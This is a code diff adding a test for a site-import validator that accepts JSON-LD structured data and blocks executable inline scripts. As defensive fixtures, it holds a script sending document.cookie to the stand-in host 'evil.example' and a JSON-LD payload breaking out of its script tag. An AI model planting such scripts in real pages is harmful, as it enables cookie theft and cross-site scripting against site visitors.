@@ -197,6 +197,59 @@ describe("external generated site import validation", () => {
     }
   });
 
+  it("allows inline JSON-LD structured data but still blocks executable inline scripts", () => {
+    // Discovered via the Designer Worker smoke test: a real Claude Code run
+    // produced a standard SEO LocalBusiness JSON-LD block, which the
+    // pre-existing inline-script regex flagged as dangerous_inline_script.
+    // design-brief.ts explicitly instructs every template/worker to emit
+    // this pattern, so blocking it was a false positive, not a real
+    // protection -- the actual risk is executable script content or a
+    // JSON-LD payload smuggling a `</script>` breakout via a `<` character.
+    const jsonLd = [
+      "<!doctype html><html><head>",
+      '<script type="application/ld+json">',
+      '{"@context":"https://schema.org","@type":"LocalBusiness","name":"Coral Ridge Cooling Co.","telephone":"(954) 555-0142"}',
+      "</script>",
+      "</head><body>ok</body></html>",
+    ].join("\n");
+    const safe = validateExternalSiteSource({
+      provider: "manual",
+      controlledPreviewUrl: "https://safe-preview.vercel.app",
+      providerPreviewUrl: null,
+      manifest: { ...fixtureManifest, files: [...fixtureManifest.files, { path: "index.html", content: jsonLd }] },
+    });
+    assert.equal(safe.validation.ok, true);
+
+    const executable = [
+      "<!doctype html><html><head>",
+      "<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>",
+      "</head><body>bad</body></html>",
+    ].join("\n");
+    const dangerous = validateExternalSiteSource({
+      provider: "manual",
+      controlledPreviewUrl: "https://safe-preview.vercel.app",
+      providerPreviewUrl: null,
+      manifest: { ...fixtureManifest, files: [...fixtureManifest.files, { path: "index.html", content: executable }] },
+    });
+    assert.equal(dangerous.validation.ok, false);
+    assert.equal(dangerous.validation.findings.some((finding) => finding.code === "dangerous_inline_script"), true);
+
+    const breakout = [
+      "<!doctype html><html><head>",
+      '<script type="application/ld+json">',
+      '{"description":"</script><script>alert(1)</script>"}',
+      "</script>",
+      "</head><body>bad</body></html>",
+    ].join("\n");
+    const breakoutResult = validateExternalSiteSource({
+      provider: "manual",
+      controlledPreviewUrl: "https://safe-preview.vercel.app",
+      providerPreviewUrl: null,
+      manifest: { ...fixtureManifest, files: [...fixtureManifest.files, { path: "index.html", content: breakout }] },
+    });
+    assert.equal(breakoutResult.validation.ok, false);
+  });
+
   it("does not treat semver, package metadata, or lockfile text as private network endpoints", () => {
     const packageJson = {
       scripts: { build: "vite build" },
